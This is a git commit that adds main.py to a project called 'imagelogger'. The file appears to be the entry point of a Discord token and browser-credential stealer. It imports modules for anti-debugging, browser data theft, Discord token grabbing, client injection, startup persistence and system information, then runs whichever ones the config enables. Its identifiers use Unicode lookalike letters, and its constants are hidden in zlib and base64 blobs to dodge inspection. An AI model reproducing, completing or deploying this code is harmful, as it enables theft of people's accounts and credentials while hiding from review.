4959edb123f1c99e50edbf9861fe7be8fe95d0fa
mkirvela123 <127632860+mkirvela123@users.noreply.github.com>
2023-03-12 02:29:07 +0400

    Add files via upload

---
+++ imagelogger/build/src/main.py
@@ -0,0 +1,21 @@
+from components.antidebug import AntiDebug
+from components.browsers import Browsers
+from components.discordtoken import DiscordToken
+from components.injection import Injection
+from components.startup import Startup
+from components.systeminfo import SystemInfo
+from config import __CONFIG__
+
+def main():
+    𝗳𝘂𝙣𝙘𝘴 = [𝘈𝗻𝘁𝙞𝘋𝙚𝗯𝘂𝘨, 𝗕𝗿𝘰𝘄𝘀𝘦𝙧𝘀, 𝘿𝘪𝘀𝗰𝘰𝗿𝙙𝗧𝘰𝗸𝘦𝗻, 𝘐𝗻𝘫𝗲𝙘𝘁𝘪𝘰𝘯, 𝙎𝙩𝙖𝙧𝘵𝙪𝗽, 𝘚𝙮𝘴𝘵𝗲𝙢𝘐𝘯𝙛𝘰]
+    for 𝗳𝘂𝙣𝗰 in 𝙛𝘶𝙣𝙘𝘀:
+        if __𝘊𝙊𝗡𝗙𝗜𝘎__[𝘧𝘂𝙣𝘤.__name__.lower()]:
+            try:
+                if 𝗳𝘶𝗻𝗰.__init__.__code__.co_argcount == 𝗶𝘯𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 386 - (𝙞𝗻𝙩(𝘖) + 𝗶), 𝗺𝙖𝙥(__𝘪𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝘪𝘁𝘦𝙧(__𝘪𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xadJ7\x00\x00\x03\xa4\x01_')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝙚(1)), __𝘪𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):
+                    𝙛𝘶𝙣𝘤(__𝗖𝙊𝘕𝙁𝘐𝗚__[__𝙞𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK1\n\xcbLt\xb7,K,\xb7\xb5\x05\x00\x1a,\x03\xff')).decode()])
+                else:
+                    𝗳𝘂𝗻𝘤()
+            except 𝗘𝘅𝘤𝙚𝙥𝙩𝗶𝘰𝘯 as e:
+                𝙥𝙧𝙞𝘯𝘵(__𝗶𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b\x8a\xf0\xaaL2\xf6LO\x0c7IO560\xf3\xf4(\xb1\x04\x00D_\x06B')).decode().format(𝗳𝘂𝘯𝘤.__name__, 𝙚))
+if __𝙣𝗮𝘮𝗲__ == __𝙞𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8b0\xb4,\x89\x0c\xcf)\x8d0\xb4\xb0\x05\x00\x19/\x03\xc6')).decode():
+    𝙢𝗮𝗶𝗻()
